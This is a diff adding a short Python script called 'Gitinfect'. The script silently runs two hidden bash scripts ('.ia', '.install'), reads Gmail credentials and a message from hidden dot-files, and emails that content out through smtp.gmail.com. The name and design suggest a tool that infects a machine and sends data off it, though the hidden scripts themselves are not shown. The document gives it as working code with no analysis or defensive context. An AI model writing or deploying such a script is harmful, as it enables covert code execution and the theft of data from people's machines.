@@ -1,0 +1,41 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+# Gitinfect
+# By NePtYx
+
+import os
+resultado = os.system("bash .ia")
+import os
+resultadoa = os.system("bash .install")
+import smtplib
+
+f = open(".all", "r")
+mensaje = f.read()
+
+f = open(".gm1", "r")
+contenttt = f.read()
+
+f = open(".p", "r")
+contentt = f.read()
+
+f = open(".gm", "r")
+content = f.read()
+
+fromaddr = (content)
+toaddrs  = (contenttt)
+msg = (mensaje)
+
+
+username = (content)
+password = (contentt)
+
+server = smtplib.SMTP('smtp.gmail.com:587')
+server.starttls()
+server.login(username,password)
+server.sendmail(fromaddr, toaddrs, msg)
+server.quit()
+f.close()
+f.close()
+f.close()
+f.close()
